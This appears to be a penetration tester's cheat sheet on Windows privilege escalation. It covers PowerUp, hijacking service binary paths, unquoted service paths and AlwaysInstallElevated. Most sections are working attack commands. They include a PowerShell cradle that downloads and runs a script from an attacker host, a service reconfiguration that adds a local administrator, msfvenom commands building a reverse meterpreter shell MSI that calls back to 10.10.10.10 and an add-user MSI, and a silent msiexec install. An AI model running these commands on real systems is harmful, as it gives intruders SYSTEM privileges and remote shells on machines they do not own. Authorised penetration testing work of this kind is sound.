### Privilege Escalation Scripts

I generally like to use PowerUp first as it's very succicnt. After that, WinPEAS if I've not got an AV issue.

```powershell
# Load powerup into memory
IEX((New-Object System.Net.WebClient).downloadString('http://10.10.10.10/powerup.ps1'))

# Run with all checks
Invoke-AllChecks
```


### Manual Checks - Misconfigured Services 

Check if there are any services you can modify the binary path of and startup type. If you can replace it on disk or point it to another file, then if you can restart the service (Or wait for a PC restart), you can obtain control and execute commands as the parent process owner.

```powershell
# Modify a service binary
sc query UpoSvc
sc config UpoSvc binpath= "c:\malicious_file.exe"
sc config UpoSvc binpath= "net localgroup administrators toby /add"

# Restart the service
net stop UpoSvc && net start UpoSvc
sc stop UpoSvc && sc start UpoSvc
```

Similar attacks can be achieved if the binary that is being executed by the service has weak permissions, thus allowing a user to either overwrite it, or replace it. 

ðŸš© Ensure in production to confirm with clients and backup any existing binaries, replacing when you're done! ðŸš©

### Manual Checks - Unquoted Service Paths

If a service binary is not wrapped in quotes, and there is a space in the path, it is possible to abuse the path to place an executable binary in one of the folders with the space. When Windows attempts to read the path to this executable, it interprets the space as a terminator. So it will attempt to execute the following (in order) for an unquoted `C:\Program Files\Vuln Services\Service.exe`:

1.  `C:\Program.exe`
2.  `C:\Program Files\Vuln.exe`
3.  `C:\Program Files\Vuln Services\Service.exe`

We need write permissions to the path. We can use powershell to find the permissions of objects. We're looking if our user/group has Write access on the path.

```powershell
Get-Acl -Path "C:\Program Files\Vuln Services" | fl
...
Access : CREATOR OWNER Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Users Allow  Write, ReadAndExecute, Synchronize
...
```

We'll place a malicious EXE in `C:\Program Files\Vuln.exe` and restart the service to execute it.

```powershell
sc stop VulnerableService
sc start VulnerableService
```


### AlwaysInstallElevated

If the following two registry keys are set to 1, then any Windows installer files will be installed and executed as SYSTEM (.msi files).

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Generate a malicious msi with msfvenom.

```bash
# Reverse meterpreter shell
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -f msi -o parrot.msi
# Add a new user
msfvenom -p windows/adduser USER=toby PASS=TobyL0v3sCoffee! -f msi -o parrot.msi 
```

Then we simply execute it on the target. `/q` stands for quiet and means the user won't get a box showing installation. `/n` stops prompting them for confirmation.

```powershell
run msiexec /i parrot.msi /q /n
```